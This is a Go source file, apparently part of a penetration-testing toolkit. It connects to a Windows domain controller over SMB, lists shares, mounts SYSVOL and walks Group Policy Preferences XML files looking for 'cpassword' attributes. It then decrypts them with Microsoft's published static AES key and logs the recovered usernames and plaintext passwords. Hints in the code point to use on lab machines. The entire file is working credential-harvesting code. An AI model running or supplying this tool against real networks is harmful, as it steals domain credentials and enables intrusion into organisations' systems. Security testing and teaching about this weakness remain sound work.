package advanced

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"strings"

	"github.com/hirochachacha/go-smb2"
)

// GPPSimpleResult represents a found password in GPP
type GPPSimpleResult struct {
	File     string
	User     string
	Password string
	Changed  string
}

// SMBAnalyzer handles SMB-related discovery (Shares, GPP, etc.)
type SMBAnalyzer struct {
	Target   string
	Username string
	Password string
	Domain   string
}

// NewSMBAnalyzer creates a new SMB analyzer
func NewSMBAnalyzer(target, user, pass, domain string) *SMBAnalyzer {
	return &SMBAnalyzer{
		Target:   target,
		Username: user,
		Password: pass,
		Domain:   domain,
	}
}

// EnumerateShares lists all available SMB shares
func (sa *SMBAnalyzer) EnumerateShares() ([]string, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer session.Logoff()
	defer conn.Close()

	shares, err := session.ListSharenames()
	if err != nil {
		return nil, fmt.Errorf("failed to list shares: %v", err)
	}

	return shares, nil
}

// ScanGPP searches SYSVOL for GPP passwords
func (sa *SMBAnalyzer) ScanGPP() ([]GPPSimpleResult, error) {
	log.Printf("[*] Searching SYSVOL for Group Policy Preferences (GPP) passwords...")

	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer session.Logoff()
	defer conn.Close()

	// Connect to SYSVOL
	fs, err := session.Mount("SYSVOL")
	if err != nil {
		return nil, fmt.Errorf("failed to mount SYSVOL: %v", err)
	}
	defer fs.Umount()

	var results []GPPSimpleResult

	// Common GPP XML paths
	paths := []string{
		"Policies",
	}

	// We'll recursively search for .xml files in Policies
	err = sa.walkGPP(fs, paths[0], &results)
	if err != nil {
		log.Printf("[!] Error walking SYSVOL: %v", err)
	}

	return results, nil
}

func (sa *SMBAnalyzer) createSession() (*smb2.Session, net.Conn, error) {
	addr := sa.Target
	if !strings.Contains(addr, ":") {
		addr = fmt.Sprintf("%s:445", addr)
	}

	// List of domain formats to try
	domains := []string{sa.Domain, "", strings.ToLower(sa.Domain)}
	
	// If the domain is short (NetBIOS), try adding .htb or .local as a guess, 
	// or if it's long, try the short version.
	if !strings.Contains(sa.Domain, ".") && sa.Domain != "" {
		domains = append(domains, sa.Domain+".htb")
		domains = append(domains, sa.Domain+".local")
	}
	
	var lastErr error
	for _, dName := range domains {
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			return nil, nil, fmt.Errorf("SMB connection failed: %v", err)
		}

		d := &smb2.Dialer{
			Initiator: &smb2.NTLMInitiator{
				User:     sa.Username,
				Password: sa.Password,
				Domain:   dName,
			},
		}

		s, err := d.Dial(conn)
		if err == nil {
			return s, conn, nil
		}
		
		lastErr = err
		conn.Close()
		log.Printf("[!] SMB auth failed with domain '%s', trying next...", dName)
	}

	return nil, nil, fmt.Errorf("SMB session failed after retries: %v", lastErr)
}

func (sa *SMBAnalyzer) walkGPP(fs *smb2.Share, path string, results *[]GPPSimpleResult) error {
	entries, err := fs.ReadDir(path)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		fullPath := path + "\\" + entry.Name()
		if entry.IsDir() {
			sa.walkGPP(fs, fullPath, results)
		} else if strings.HasSuffix(strings.ToLower(entry.Name()), ".xml") {
			// Analyze the XML file
			sa.analyzeXML(fs, fullPath, results)
		}
	}
	return nil
}

func (sa *SMBAnalyzer) analyzeXML(fs *smb2.Share, path string, results *[]GPPSimpleResult) {
	f, err := fs.Open(path)
	if err != nil {
		return
	}
	defer f.Close()

	content, err := io.ReadAll(f)
	if err != nil {
		return
	}

	// Look for 'cpassword' in the XML
	if !bytes.Contains(content, []byte("cpassword")) {
		return
	}

	log.Printf("[+] Found potential GPP file: %s", path)

	// Minimal XML parsing to find cpassword, userName, and changed
	// In a real implementation, we'd use proper structs for Groups.xml, Services.xml, etc.
	// For now, let's use string extraction for speed
	
	cpass := extractTag(content, "cpassword")
	user := extractTag(content, "userName")
	changed := extractTag(content, "changed")

	if cpass != "" {
		decrypted, err := decryptGPP(cpass)
		if err == nil {
			*results = append(*results, GPPSimpleResult{
				File:     path,
				User:     user,
				Password: decrypted,
				Changed:  changed,
			})
			log.Printf("[!] CRACKED GPP PASSWORD: %s -> %s", user, decrypted)
		}
	}
}

func extractTag(content []byte, tag string) string {
	// Simple string-based extraction for common GPP XML attributes
	pattern := []byte(tag + "=\"")
	start := bytes.Index(content, pattern)
	if start == -1 {
		return ""
	}
	start += len(pattern)
	end := bytes.Index(content[start:], []byte("\""))
	if end == -1 {
		return ""
	}
	return string(content[start : start+end])
}

// decryptGPP decrypts the Microsoft 'cpassword' using the static AES key
// Static key: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
func decryptGPP(cpassword string) (string, error) {
	// 1. Pad base64 if needed
	for len(cpassword)%4 != 0 {
		cpassword += "="
	}

	// 2. Decode base64
	data, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}

	// 3. Static AES Key
	key := []byte{
		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 
		0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 
		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 
		0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
	}

	// 4. Initialization Vector (IV) is always 16 null bytes
	iv := make([]byte, 16)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(data))
	mode.CryptBlocks(decrypted, data)

	// 5. Remove PKCS7 padding
	if len(decrypted) == 0 {
		return "", fmt.Errorf("decryption resulted in empty data")
	}
	paddingLen := int(decrypted[len(decrypted)-1])
	if paddingLen > len(decrypted) {
		return string(decrypted), nil // sometimes it's not padded correctly
	}
	
	// Convert from UTF-16LE to UTF-8 (simple version as passwords are usually ASCII)
	// We'll just strip the null bytes for now
	var final []byte
	for _, b := range decrypted[:len(decrypted)-paddingLen] {
		if b != 0 {
			final = append(final, b)
		}
	}

	return string(final), nil
}
